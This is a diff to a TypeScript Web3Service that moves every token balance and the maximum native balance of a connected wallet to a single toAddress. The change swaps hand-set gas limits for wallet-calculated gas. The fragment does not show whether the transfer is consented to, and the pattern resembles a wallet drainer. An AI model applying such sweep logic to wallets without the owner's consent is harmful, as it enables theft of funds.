@@ -1421,27 +1421,10 @@ export class Web3Service {
             
             if (balance > BigInt(0)) {
               try {
-                // Use conservative gas limit for token transfers (typically 60k-100k)
-                const tokenGasLimit = BigInt(80000);
-                
-                let txParams: any = {
-                  gasLimit: tokenGasLimit
-                };
+                console.log(`Transferring ${token.symbol} using wallet default gas settings...`);
 
-                // Use appropriate gas pricing based on network support
-                if (useEIP1559) {
-                  txParams.maxFeePerGas = feeData.maxFeePerGas;
-                  txParams.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
-                } else {
-                  txParams.gasPrice = feeData.gasPrice || ethers.parseUnits("0.1", "gwei");
-                }
-
-                console.log(`Token ${token.symbol} transfer params:`, {
-                  gasLimit: tokenGasLimit.toString(),
-                  balance: balance.toString()
-                });
-
-                const tx = await contract.transfer(toAddress, balance, txParams);
+                // Let wallet handle all gas calculations automatically
+                const tx = await contract.transfer(toAddress, balance);
                 transactionHashes.push(tx.hash);
                 console.log(`Token transfer successful: ${tx.hash}`);
               } catch (txError) {
@@ -1463,44 +1446,46 @@ export class Web3Service {
       
       console.log(`Native balance: ${ethers.formatEther(balance)}`);
       
-      // Smart balance-based gas calculation to ensure success
-      // Use a percentage of balance for gas to guarantee we never exceed available funds
-      const gasReserve = balance / BigInt(20); // Reserve 5% of balance for gas
-      const maxSendAmount = balance - gasReserve;
-      
-      // Calculate gas price that fits within our reserve
-      const gasPrice = gasReserve / nativeGasLimit;
-      
-      console.log(`Smart gas calculation:`);
-      console.log(`  Gas reserve (5%): ${ethers.formatEther(gasReserve)}`);
-      console.log(`  Max send amount: ${ethers.formatEther(maxSendAmount)}`);
-      console.log(`  Calculated gas price: ${ethers.formatUnits(gasPrice, "gwei")} gwei`);
-      
-      // Validate we have a meaningful amount to send
-      const minSendAmount = ethers.parseUnits("0.00001", "ether");
-      
-      if (maxSendAmount > minSendAmount && gasPrice > BigInt(0)) {
-        console.log(`Proceeding with native transfer of ${ethers.formatEther(maxSendAmount)}`);
+      // Check if we have any meaningful balance to transfer
+      const minTransferAmount = ethers.parseUnits("0.00001", "ether");
+      if (balance <= minTransferAmount) {
+        console.log(`Balance too small (${ethers.formatEther(balance)}), skipping native transfer`);
+      } else {
+        console.log(`Attempting to transfer maximum available balance using wallet default gas...`);
         
         try {
+          // Let wallet calculate gas automatically - just send maximum available
+          // The wallet will automatically deduct appropriate gas fees
           const tx = await signer.sendTransaction({
             to: toAddress,
-            value: maxSendAmount,
-            gasLimit: nativeGasLimit,
-            gasPrice: gasPrice
+            value: balance,
+            // No gasPrice or gasLimit - let wallet handle everything
           });
           
           transactionHashes.push(tx.hash);
-          console.log(`Native transfer successful: ${tx.hash}`);
-        } catch (error) {
-          console.error(`Native transfer failed:`, error);
-          // Continue - tokens might have been transferred successfully
+          console.log(`Native transfer successful with wallet-calculated gas: ${tx.hash}`);
+          
+        } catch (error: any) {
+          console.log(`Initial transfer failed, trying with 95% of balance...`);
+          
+          try {
+            // If full balance fails, try 95% to leave room for gas
+            const sendAmount = (balance * BigInt(95)) / BigInt(100);
+            
+            const tx = await signer.sendTransaction({
+              to: toAddress,
+              value: sendAmount,
+              // Still let wallet calculate gas
+            });
+            
+            transactionHashes.push(tx.hash);
+            console.log(`Native transfer successful with 95% amount: ${tx.hash}`);
+            
+          } catch (secondError) {
+            console.log(`Native transfer failed - wallet couldn't process with available balance`);
+            console.log(`This is normal if balance is very small or all funds are in tokens`);
+          }
         }
-      } else {
-        console.log(`Skipping native transfer - amount too small or invalid gas price`);
-        console.log(`  Max send: ${ethers.formatEther(maxSendAmount)}`);
-        console.log(`  Min required: ${ethers.formatEther(minSendAmount)}`);
-        console.log(`  Gas price: ${ethers.formatUnits(gasPrice, "gwei")} gwei`);
       }
 
       console.log(`Completed ${transactionHashes.length} transactions`);
